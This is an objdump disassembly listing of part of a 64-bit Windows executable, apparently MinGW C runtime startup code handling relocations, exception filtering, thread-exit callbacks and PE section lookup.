   140001e8f:	e9 3e fe ff ff       	jmp    0x140001cd2
   140001e94:	0f 1f 40 00          	nopl   0x0(%rax)
   140001e98:	85 d2                	test   %edx,%edx
   140001e9a:	0f 85 80 00 00 00    	jne    0x140001f20
   140001ea0:	8b 43 04             	mov    0x4(%rbx),%eax
   140001ea3:	89 c7                	mov    %eax,%edi
   140001ea5:	0b 7b 08             	or     0x8(%rbx),%edi
   140001ea8:	0f 85 aa fe ff ff    	jne    0x140001d58
   140001eae:	8b 53 0c             	mov    0xc(%rbx),%edx
   140001eb1:	48 83 c3 0c          	add    $0xc,%rbx
   140001eb5:	e9 93 fe ff ff       	jmp    0x140001d4d
   140001eba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001ec0:	41 83 f8 40          	cmp    $0x40,%r8d
   140001ec4:	0f 85 a7 00 00 00    	jne    0x140001f71
   140001eca:	48 8b 01             	mov    (%rcx),%rax
   140001ecd:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001ed3:	4c 89 ff             	mov    %r15,%rdi
   140001ed6:	48 29 d0             	sub    %rdx,%rax
   140001ed9:	4c 89 fa             	mov    %r15,%rdx
   140001edc:	4c 01 c8             	add    %r9,%rax
   140001edf:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140001ee3:	e8 a8 fb ff ff       	call   0x140001a90
   140001ee8:	e9 d3 fe ff ff       	jmp    0x140001dc0
   140001eed:	0f 1f 00             	nopl   (%rax)
   140001ef0:	8b 01                	mov    (%rcx),%eax
   140001ef2:	4c 89 ff             	mov    %r15,%rdi
   140001ef5:	49 89 c0             	mov    %rax,%r8
   140001ef8:	4c 09 f0             	or     %r14,%rax
   140001efb:	45 85 c0             	test   %r8d,%r8d
   140001efe:	49 0f 49 c0          	cmovns %r8,%rax
   140001f02:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001f08:	48 29 d0             	sub    %rdx,%rax
   140001f0b:	4c 89 fa             	mov    %r15,%rdx
   140001f0e:	4c 01 c8             	add    %r9,%rax
   140001f11:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140001f15:	e8 76 fb ff ff       	call   0x140001a90
   140001f1a:	e9 a1 fe ff ff       	jmp    0x140001dc0
   140001f1f:	90                   	nop
   140001f20:	4c 39 e3             	cmp    %r12,%rbx
   140001f23:	0f 83 a9 fd ff ff    	jae    0x140001cd2
   140001f29:	49 83 ec 01          	sub    $0x1,%r12
   140001f2d:	4c 8b 2d 6c 25 00 00 	mov    0x256c(%rip),%r13        # 0x1400044a0
   140001f34:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
   140001f38:	49 29 dc             	sub    %rbx,%r12
   140001f3b:	49 c1 ec 03          	shr    $0x3,%r12
   140001f3f:	4e 8d 64 e3 08       	lea    0x8(%rbx,%r12,8),%r12
   140001f44:	0f 1f 40 00          	nopl   0x0(%rax)
   140001f48:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001f4b:	8b 03                	mov    (%rbx),%eax
   140001f4d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001f53:	48 89 fa             	mov    %rdi,%rdx
   140001f56:	48 83 c3 08          	add    $0x8,%rbx
   140001f5a:	4c 01 e9             	add    %r13,%rcx
   140001f5d:	03 01                	add    (%rcx),%eax
   140001f5f:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140001f62:	e8 29 fb ff ff       	call   0x140001a90
   140001f67:	4c 39 e3             	cmp    %r12,%rbx
   140001f6a:	75 dc                	jne    0x140001f48
   140001f6c:	e9 cf fe ff ff       	jmp    0x140001e40
   140001f71:	44 89 c2             	mov    %r8d,%edx
   140001f74:	48 8d 0d 3d 24 00 00 	lea    0x243d(%rip),%rcx        # 0x1400043b8
   140001f7b:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
   140001f82:	00 
   140001f83:	e8 98 fa ff ff       	call   0x140001a20
   140001f88:	48 8d 0d f1 23 00 00 	lea    0x23f1(%rip),%rcx        # 0x140004380
   140001f8f:	e8 8c fa ff ff       	call   0x140001a20
   140001f94:	90                   	nop
   140001f95:	90                   	nop
   140001f96:	90                   	nop
   140001f97:	90                   	nop
   140001f98:	90                   	nop
   140001f99:	90                   	nop
   140001f9a:	90                   	nop
   140001f9b:	90                   	nop
   140001f9c:	90                   	nop
   140001f9d:	90                   	nop
   140001f9e:	90                   	nop
   140001f9f:	90                   	nop
   140001fa0:	48 83 ec 58          	sub    $0x58,%rsp
   140001fa4:	48 8b 05 05 51 00 00 	mov    0x5105(%rip),%rax        # 0x1400070b0
   140001fab:	48 85 c0             	test   %rax,%rax
   140001fae:	74 2c                	je     0x140001fdc
   140001fb0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140001fb7:	00 00 
   140001fb9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140001fbd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001fc2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001fc7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140001fcd:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140001fd3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140001fd9:	ff d0                	call   *%rax
   140001fdb:	90                   	nop
   140001fdc:	48 83 c4 58          	add    $0x58,%rsp
   140001fe0:	c3                   	ret
   140001fe1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001fe8:	00 00 00 00 
   140001fec:	0f 1f 40 00          	nopl   0x0(%rax)
   140001ff0:	48 89 0d b9 50 00 00 	mov    %rcx,0x50b9(%rip)        # 0x1400070b0
   140001ff7:	e9 84 0b 00 00       	jmp    0x140002b80
   140001ffc:	90                   	nop
   140001ffd:	90                   	nop
   140001ffe:	90                   	nop
   140001fff:	90                   	nop
   140002000:	41 54                	push   %r12
   140002002:	48 83 ec 20          	sub    $0x20,%rsp
   140002006:	48 8b 11             	mov    (%rcx),%rdx
   140002009:	8b 02                	mov    (%rdx),%eax
   14000200b:	49 89 cc             	mov    %rcx,%r12
   14000200e:	89 c1                	mov    %eax,%ecx
   140002010:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   140002016:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   14000201c:	0f 84 ce 00 00 00    	je     0x1400020f0
   140002022:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140002027:	0f 87 aa 00 00 00    	ja     0x1400020d7
   14000202d:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   140002032:	76 54                	jbe    0x140002088
   140002034:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   140002039:	83 f8 09             	cmp    $0x9,%eax
   14000203c:	77 3a                	ja     0x140002078
   14000203e:	48 8d 15 ab 23 00 00 	lea    0x23ab(%rip),%rdx        # 0x1400043f0
   140002045:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002049:	48 01 d0             	add    %rdx,%rax
   14000204c:	ff e0                	jmp    *%rax
   14000204e:	31 d2                	xor    %edx,%edx
   140002050:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002055:	e8 0e 0b 00 00       	call   0x140002b68
   14000205a:	48 83 f8 01          	cmp    $0x1,%rax
   14000205e:	0f 85 b7 00 00 00    	jne    0x14000211b
   140002064:	ba 01 00 00 00       	mov    $0x1,%edx
   140002069:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000206e:	e8 f5 0a 00 00       	call   0x140002b68
   140002073:	e8 98 f9 ff ff       	call   0x140001a10
   140002078:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000207d:	48 83 c4 20          	add    $0x20,%rsp
   140002081:	41 5c                	pop    %r12
   140002083:	c3                   	ret
   140002084:	0f 1f 40 00          	nopl   0x0(%rax)
   140002088:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   14000208d:	0f 84 a5 00 00 00    	je     0x140002138
   140002093:	76 3b                	jbe    0x1400020d0
   140002095:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   14000209a:	74 dc                	je     0x140002078
   14000209c:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   1400020a1:	75 34                	jne    0x1400020d7
   1400020a3:	31 d2                	xor    %edx,%edx
   1400020a5:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400020aa:	e8 b9 0a 00 00       	call   0x140002b68
   1400020af:	48 83 f8 01          	cmp    $0x1,%rax
   1400020b3:	0f 84 a7 00 00 00    	je     0x140002160
   1400020b9:	48 85 c0             	test   %rax,%rax
   1400020bc:	74 19                	je     0x1400020d7
   1400020be:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400020c3:	ff d0                	call   *%rax
   1400020c5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400020ca:	eb b1                	jmp    0x14000207d
   1400020cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400020d0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   1400020d5:	74 a1                	je     0x140002078
   1400020d7:	48 8b 05 f2 4f 00 00 	mov    0x4ff2(%rip),%rax        # 0x1400070d0
   1400020de:	48 85 c0             	test   %rax,%rax
   1400020e1:	74 1d                	je     0x140002100
   1400020e3:	4c 89 e1             	mov    %r12,%rcx
   1400020e6:	48 83 c4 20          	add    $0x20,%rsp
   1400020ea:	41 5c                	pop    %r12
   1400020ec:	48 ff e0             	rex.W jmp *%rax
   1400020ef:	90                   	nop
   1400020f0:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   1400020f4:	0f 85 28 ff ff ff    	jne    0x140002022
   1400020fa:	e9 79 ff ff ff       	jmp    0x140002078
   1400020ff:	90                   	nop
   140002100:	31 c0                	xor    %eax,%eax
   140002102:	48 83 c4 20          	add    $0x20,%rsp
   140002106:	41 5c                	pop    %r12
   140002108:	c3                   	ret
   140002109:	31 d2                	xor    %edx,%edx
   14000210b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002110:	e8 53 0a 00 00       	call   0x140002b68
   140002115:	48 83 f8 01          	cmp    $0x1,%rax
   140002119:	74 65                	je     0x140002180
   14000211b:	48 85 c0             	test   %rax,%rax
   14000211e:	74 b7                	je     0x1400020d7
   140002120:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002125:	ff d0                	call   *%rax
   140002127:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000212c:	e9 4c ff ff ff       	jmp    0x14000207d
   140002131:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002138:	31 d2                	xor    %edx,%edx
   14000213a:	b9 0b 00 00 00       	mov    $0xb,%ecx
   14000213f:	e8 24 0a 00 00       	call   0x140002b68
   140002144:	48 83 f8 01          	cmp    $0x1,%rax
   140002148:	74 4f                	je     0x140002199
   14000214a:	48 85 c0             	test   %rax,%rax
   14000214d:	74 88                	je     0x1400020d7
   14000214f:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140002154:	ff d0                	call   *%rax
   140002156:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000215b:	e9 1d ff ff ff       	jmp    0x14000207d
   140002160:	ba 01 00 00 00       	mov    $0x1,%edx
   140002165:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000216a:	e8 f9 09 00 00       	call   0x140002b68
   14000216f:	83 c8 ff             	or     $0xffffffff,%eax
   140002172:	e9 06 ff ff ff       	jmp    0x14000207d
   140002177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000217e:	00 00 
   140002180:	ba 01 00 00 00       	mov    $0x1,%edx
   140002185:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000218a:	e8 d9 09 00 00       	call   0x140002b68
   14000218f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002194:	e9 e4 fe ff ff       	jmp    0x14000207d
   140002199:	ba 01 00 00 00       	mov    $0x1,%edx
   14000219e:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400021a3:	e8 c0 09 00 00       	call   0x140002b68
   1400021a8:	83 c8 ff             	or     $0xffffffff,%eax
   1400021ab:	e9 cd fe ff ff       	jmp    0x14000207d
   1400021b0:	41 54                	push   %r12
   1400021b2:	57                   	push   %rdi
   1400021b3:	56                   	push   %rsi
   1400021b4:	53                   	push   %rbx
   1400021b5:	48 83 ec 28          	sub    $0x28,%rsp
   1400021b9:	48 8d 0d 40 4f 00 00 	lea    0x4f40(%rip),%rcx        # 0x140007100
   1400021c0:	ff 15 5a 61 00 00    	call   *0x615a(%rip)        # 0x140008320
   1400021c6:	48 8b 1d 13 4f 00 00 	mov    0x4f13(%rip),%rbx        # 0x1400070e0
   1400021cd:	48 85 db             	test   %rbx,%rbx
   1400021d0:	74 32                	je     0x140002204
   1400021d2:	48 8b 3d 97 61 00 00 	mov    0x6197(%rip),%rdi        # 0x140008370
   1400021d9:	48 8b 35 48 61 00 00 	mov    0x6148(%rip),%rsi        # 0x140008328
   1400021e0:	8b 0b                	mov    (%rbx),%ecx
   1400021e2:	ff d7                	call   *%rdi
   1400021e4:	49 89 c4             	mov    %rax,%r12
   1400021e7:	ff d6                	call   *%rsi
   1400021e9:	85 c0                	test   %eax,%eax
   1400021eb:	75 0e                	jne    0x1400021fb
   1400021ed:	4d 85 e4             	test   %r12,%r12
   1400021f0:	74 09                	je     0x1400021fb
   1400021f2:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400021f6:	4c 89 e1             	mov    %r12,%rcx
   1400021f9:	ff d0                	call   *%rax
   1400021fb:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400021ff:	48 85 db             	test   %rbx,%rbx
   140002202:	75 dc                	jne    0x1400021e0
   140002204:	48 8d 0d f5 4e 00 00 	lea    0x4ef5(%rip),%rcx        # 0x140007100
   14000220b:	48 83 c4 28          	add    $0x28,%rsp
   14000220f:	5b                   	pop    %rbx
   140002210:	5e                   	pop    %rsi
   140002211:	5f                   	pop    %rdi
   140002212:	41 5c                	pop    %r12
   140002214:	48 ff 25 2d 61 00 00 	rex.W jmp *0x612d(%rip)        # 0x140008348
   14000221b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002220:	57                   	push   %rdi
   140002221:	56                   	push   %rsi
   140002222:	53                   	push   %rbx
   140002223:	48 83 ec 20          	sub    $0x20,%rsp
   140002227:	8b 05 bb 4e 00 00    	mov    0x4ebb(%rip),%eax        # 0x1400070e8
   14000222d:	89 cf                	mov    %ecx,%edi
   14000222f:	48 89 d6             	mov    %rdx,%rsi
   140002232:	85 c0                	test   %eax,%eax
   140002234:	75 0a                	jne    0x140002240
   140002236:	48 83 c4 20          	add    $0x20,%rsp
   14000223a:	5b                   	pop    %rbx
   14000223b:	5e                   	pop    %rsi
   14000223c:	5f                   	pop    %rdi
   14000223d:	c3                   	ret
   14000223e:	66 90                	xchg   %ax,%ax
   140002240:	ba 18 00 00 00       	mov    $0x18,%edx
   140002245:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000224a:	e8 59 09 00 00       	call   0x140002ba8
   14000224f:	48 89 c3             	mov    %rax,%rbx
   140002252:	48 85 c0             	test   %rax,%rax
   140002255:	74 3c                	je     0x140002293
   140002257:	89 38                	mov    %edi,(%rax)
   140002259:	48 8d 0d a0 4e 00 00 	lea    0x4ea0(%rip),%rcx        # 0x140007100
   140002260:	48 89 70 08          	mov    %rsi,0x8(%rax)
   140002264:	ff 15 b6 60 00 00    	call   *0x60b6(%rip)        # 0x140008320
   14000226a:	48 8b 05 6f 4e 00 00 	mov    0x4e6f(%rip),%rax        # 0x1400070e0
   140002271:	48 8d 0d 88 4e 00 00 	lea    0x4e88(%rip),%rcx        # 0x140007100
   140002278:	48 89 1d 61 4e 00 00 	mov    %rbx,0x4e61(%rip)        # 0x1400070e0
   14000227f:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002283:	ff 15 bf 60 00 00    	call   *0x60bf(%rip)        # 0x140008348
   140002289:	31 c0                	xor    %eax,%eax
   14000228b:	48 83 c4 20          	add    $0x20,%rsp
   14000228f:	5b                   	pop    %rbx
   140002290:	5e                   	pop    %rsi
   140002291:	5f                   	pop    %rdi
   140002292:	c3                   	ret
   140002293:	83 c8 ff             	or     $0xffffffff,%eax
   140002296:	eb 9e                	jmp    0x140002236
   140002298:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000229f:	00 
   1400022a0:	53                   	push   %rbx
   1400022a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400022a5:	8b 05 3d 4e 00 00    	mov    0x4e3d(%rip),%eax        # 0x1400070e8
   1400022ab:	89 cb                	mov    %ecx,%ebx
   1400022ad:	85 c0                	test   %eax,%eax
   1400022af:	75 0f                	jne    0x1400022c0
   1400022b1:	31 c0                	xor    %eax,%eax
   1400022b3:	48 83 c4 20          	add    $0x20,%rsp
   1400022b7:	5b                   	pop    %rbx
   1400022b8:	c3                   	ret
   1400022b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400022c0:	48 8d 0d 39 4e 00 00 	lea    0x4e39(%rip),%rcx        # 0x140007100
   1400022c7:	ff 15 53 60 00 00    	call   *0x6053(%rip)        # 0x140008320
   1400022cd:	48 8b 0d 0c 4e 00 00 	mov    0x4e0c(%rip),%rcx        # 0x1400070e0
   1400022d4:	48 85 c9             	test   %rcx,%rcx
   1400022d7:	74 2a                	je     0x140002303
   1400022d9:	31 d2                	xor    %edx,%edx
   1400022db:	eb 0e                	jmp    0x1400022eb
   1400022dd:	0f 1f 00             	nopl   (%rax)
   1400022e0:	48 89 ca             	mov    %rcx,%rdx
   1400022e3:	48 85 c0             	test   %rax,%rax
   1400022e6:	74 1b                	je     0x140002303
   1400022e8:	48 89 c1             	mov    %rax,%rcx
   1400022eb:	8b 01                	mov    (%rcx),%eax
   1400022ed:	39 d8                	cmp    %ebx,%eax
   1400022ef:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400022f3:	75 eb                	jne    0x1400022e0
   1400022f5:	48 85 d2             	test   %rdx,%rdx
   1400022f8:	74 26                	je     0x140002320
   1400022fa:	48 89 42 10          	mov    %rax,0x10(%rdx)
   1400022fe:	e8 ad 08 00 00       	call   0x140002bb0
   140002303:	48 8d 0d f6 4d 00 00 	lea    0x4df6(%rip),%rcx        # 0x140007100
   14000230a:	ff 15 38 60 00 00    	call   *0x6038(%rip)        # 0x140008348
   140002310:	31 c0                	xor    %eax,%eax
   140002312:	48 83 c4 20          	add    $0x20,%rsp
   140002316:	5b                   	pop    %rbx
   140002317:	c3                   	ret
   140002318:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000231f:	00 
   140002320:	48 89 05 b9 4d 00 00 	mov    %rax,0x4db9(%rip)        # 0x1400070e0
   140002327:	eb d5                	jmp    0x1400022fe
   140002329:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002330:	53                   	push   %rbx
   140002331:	48 83 ec 20          	sub    $0x20,%rsp
   140002335:	83 fa 02             	cmp    $0x2,%edx
   140002338:	0f 84 c2 00 00 00    	je     0x140002400
   14000233e:	77 28                	ja     0x140002368
   140002340:	85 d2                	test   %edx,%edx
   140002342:	74 4c                	je     0x140002390
   140002344:	8b 05 9e 4d 00 00    	mov    0x4d9e(%rip),%eax        # 0x1400070e8
   14000234a:	85 c0                	test   %eax,%eax
   14000234c:	74 32                	je     0x140002380
   14000234e:	c7 05 90 4d 00 00 01 	movl   $0x1,0x4d90(%rip)        # 0x1400070e8
   140002355:	00 00 00 
   140002358:	b8 01 00 00 00       	mov    $0x1,%eax
   14000235d:	48 83 c4 20          	add    $0x20,%rsp
   140002361:	5b                   	pop    %rbx
   140002362:	c3                   	ret
   140002363:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002368:	83 fa 03             	cmp    $0x3,%edx
   14000236b:	75 eb                	jne    0x140002358
   14000236d:	8b 05 75 4d 00 00    	mov    0x4d75(%rip),%eax        # 0x1400070e8
   140002373:	85 c0                	test   %eax,%eax
   140002375:	74 e1                	je     0x140002358
   140002377:	e8 34 fe ff ff       	call   0x1400021b0
   14000237c:	eb da                	jmp    0x140002358
   14000237e:	66 90                	xchg   %ax,%ax
   140002380:	48 8d 0d 79 4d 00 00 	lea    0x4d79(%rip),%rcx        # 0x140007100
   140002387:	ff 15 b3 5f 00 00    	call   *0x5fb3(%rip)        # 0x140008340
   14000238d:	eb bf                	jmp    0x14000234e
   14000238f:	90                   	nop
   140002390:	8b 05 52 4d 00 00    	mov    0x4d52(%rip),%eax        # 0x1400070e8
   140002396:	85 c0                	test   %eax,%eax
   140002398:	74 05                	je     0x14000239f
   14000239a:	e8 11 fe ff ff       	call   0x1400021b0
   14000239f:	8b 05 43 4d 00 00    	mov    0x4d43(%rip),%eax        # 0x1400070e8
   1400023a5:	83 f8 01             	cmp    $0x1,%eax
   1400023a8:	75 ae                	jne    0x140002358
   1400023aa:	48 8b 1d 2f 4d 00 00 	mov    0x4d2f(%rip),%rbx        # 0x1400070e0
   1400023b1:	48 85 db             	test   %rbx,%rbx
   1400023b4:	74 1b                	je     0x1400023d1
   1400023b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400023bd:	00 00 00 
   1400023c0:	48 89 d9             	mov    %rbx,%rcx
   1400023c3:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400023c7:	e8 e4 07 00 00       	call   0x140002bb0
   1400023cc:	48 85 db             	test   %rbx,%rbx
   1400023cf:	75 ef                	jne    0x1400023c0
   1400023d1:	48 8d 0d 28 4d 00 00 	lea    0x4d28(%rip),%rcx        # 0x140007100
   1400023d8:	48 c7 05 fd 4c 00 00 	movq   $0x0,0x4cfd(%rip)        # 0x1400070e0
   1400023df:	00 00 00 00 
   1400023e3:	c7 05 fb 4c 00 00 00 	movl   $0x0,0x4cfb(%rip)        # 0x1400070e8
   1400023ea:	00 00 00 
   1400023ed:	ff 15 25 5f 00 00    	call   *0x5f25(%rip)        # 0x140008318
   1400023f3:	e9 60 ff ff ff       	jmp    0x140002358
   1400023f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400023ff:	00 
   140002400:	e8 0b f6 ff ff       	call   0x140001a10
   140002405:	b8 01 00 00 00       	mov    $0x1,%eax
   14000240a:	48 83 c4 20          	add    $0x20,%rsp
   14000240e:	5b                   	pop    %rbx
   14000240f:	c3                   	ret
   140002410:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002414:	48 8d 14 08          	lea    (%rax,%rcx,1),%rdx
   140002418:	31 c0                	xor    %eax,%eax
   14000241a:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140002420:	75 0b                	jne    0x14000242d
   140002422:	31 c0                	xor    %eax,%eax
   140002424:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   14000242a:	0f 94 c0             	sete   %al
   14000242d:	c3                   	ret
   14000242e:	66 90                	xchg   %ax,%ax
   140002430:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002435:	75 09                	jne    0x140002440
   140002437:	eb d7                	jmp    0x140002410
   140002439:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002440:	31 c0                	xor    %eax,%eax
   140002442:	c3                   	ret
   140002443:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000244a:	00 00 00 00 
   14000244e:	66 90                	xchg   %ax,%ax
   140002450:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002454:	48 01 c1             	add    %rax,%rcx
   140002457:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000245b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140002460:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   140002464:	85 c9                	test   %ecx,%ecx
   140002466:	74 2d                	je     0x140002495
   140002468:	83 e9 01             	sub    $0x1,%ecx
   14000246b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000246f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   140002474:	0f 1f 40 00          	nopl   0x0(%rax)
   140002478:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000247c:	4c 89 c1             	mov    %r8,%rcx
   14000247f:	49 39 d0             	cmp    %rdx,%r8
   140002482:	77 08                	ja     0x14000248c
   140002484:	03 48 08             	add    0x8(%rax),%ecx
   140002487:	48 39 d1             	cmp    %rdx,%rcx
   14000248a:	77 0b                	ja     0x140002497
   14000248c:	48 83 c0 28          	add    $0x28,%rax
   140002490:	4c 39 c8             	cmp    %r9,%rax
   140002493:	75 e3                	jne    0x140002478
   140002495:	31 c0                	xor    %eax,%eax
   140002497:	c3                   	ret
   140002498:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000249f:	00 
   1400024a0:	41 54                	push   %r12
   1400024a2:	56                   	push   %rsi
   1400024a3:	53                   	push   %rbx
   1400024a4:	48 83 ec 20          	sub    $0x20,%rsp
   1400024a8:	48 89 cb             	mov    %rcx,%rbx
   1400024ab:	e8 e0 05 00 00       	call   0x140002a90
   1400024b0:	48 83 f8 08          	cmp    $0x8,%rax
   1400024b4:	77 7a                	ja     0x140002530
   1400024b6:	48 8b 0d e3 1f 00 00 	mov    0x1fe3(%rip),%rcx        # 0x1400044a0
   1400024bd:	45 31 e4             	xor    %r12d,%r12d
   1400024c0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   1400024c5:	75 57                	jne    0x14000251e
   1400024c7:	e8 44 ff ff ff       	call   0x140002410
   1400024cc:	85 c0                	test   %eax,%eax
   1400024ce:	74 4e                	je     0x14000251e
   1400024d0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400024d4:	48 01 c1             	add    %rax,%rcx
   1400024d7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400024db:	4c 8d 64 01 18       	lea    0x18(%rcx,%rax,1),%r12
   1400024e0:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400024e4:	85 c0                	test   %eax,%eax
   1400024e6:	74 48                	je     0x140002530
   1400024e8:	83 e8 01             	sub    $0x1,%eax
   1400024eb:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400024ef:	49 8d 74 c4 28       	lea    0x28(%r12,%rax,8),%rsi
   1400024f4:	eb 13                	jmp    0x140002509
   1400024f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400024fd:	00 00 00 
   140002500:	49 83 c4 28          	add    $0x28,%r12
   140002504:	49 39 f4             	cmp    %rsi,%r12
   140002507:	74 27                	je     0x140002530
   140002509:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000250f:	48 89 da             	mov    %rbx,%rdx
   140002512:	4c 89 e1             	mov    %r12,%rcx
   140002515:	e8 7e 05 00 00       	call   0x140002a98
   14000251a:	85 c0                	test   %eax,%eax
   14000251c:	75 e2                	jne    0x140002500
   14000251e:	4c 89 e0             	mov    %r12,%rax
   140002521:	48 83 c4 20          	add    $0x20,%rsp
   140002525:	5b                   	pop    %rbx
   140002526:	5e                   	pop    %rsi
   140002527:	41 5c                	pop    %r12
   140002529:	c3                   	ret
   14000252a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002530:	45 31 e4             	xor    %r12d,%r12d
   140002533:	4c 89 e0             	mov    %r12,%rax
   140002536:	48 83 c4 20          	add    $0x20,%rsp
   14000253a:	5b                   	pop    %rbx
   14000253b:	5e                   	pop    %rsi
   14000253c:	41 5c                	pop    %r12
   14000253e:	c3                   	ret
   14000253f:	90                   	nop
   140002540:	48 83 ec 28          	sub    $0x28,%rsp
   140002544:	4c 8b 15 55 1f 00 00 	mov    0x1f55(%rip),%r10        # 0x1400044a0
   14000254b:	45 31 c0             	xor    %r8d,%r8d
   14000254e:	66 41 81 3a 4d 5a    	cmpw   $0x5a4d,(%r10)
   140002554:	49 89 c9             	mov    %rcx,%r9
   140002557:	75 60                	jne    0x1400025b9
   140002559:	4c 89 d1             	mov    %r10,%rcx
   14000255c:	e8 af fe ff ff       	call   0x140002410
   140002561:	85 c0                	test   %eax,%eax
   140002563:	74 54                	je     0x1400025b9
   140002565:	49 63 42 3c          	movslq 0x3c(%r10),%rax
   140002569:	4c 89 c9             	mov    %r9,%rcx
   14000256c:	4c 29 d1             	sub    %r10,%rcx
   14000256f:	49 01 c2             	add    %rax,%r10
   140002572:	41 0f b7 42 14       	movzwl 0x14(%r10),%eax
   140002577:	4d 8d 44 02 18       	lea    0x18(%r10,%rax,1),%r8
   14000257c:	41 0f b7 42 06       	movzwl 0x6(%r10),%eax
   140002581:	85 c0                	test   %eax,%eax
   140002583:	74 31                	je     0x1400025b6
   140002585:	83 e8 01             	sub    $0x1,%eax
   140002588:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000258c:	4d 8d 4c c0 28       	lea    0x28(%r8,%rax,8),%r9
   140002591:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002598:	41 8b 50 0c          	mov    0xc(%r8),%edx
   14000259c:	48 89 d0             	mov    %rdx,%rax
   14000259f:	48 39 d1             	cmp    %rdx,%rcx
   1400025a2:	72 09                	jb     0x1400025ad
   1400025a4:	41 03 40 08          	add    0x8(%r8),%eax
   1400025a8:	48 39 c1             	cmp    %rax,%rcx
   1400025ab:	72 0c                	jb     0x1400025b9
   1400025ad:	49 83 c0 28          	add    $0x28,%r8
   1400025b1:	4d 39 c8             	cmp    %r9,%r8
   1400025b4:	75 e2                	jne    0x140002598
   1400025b6:	45 31 c0             	xor    %r8d,%r8d
   1400025b9:	4c 89 c0             	mov    %r8,%rax
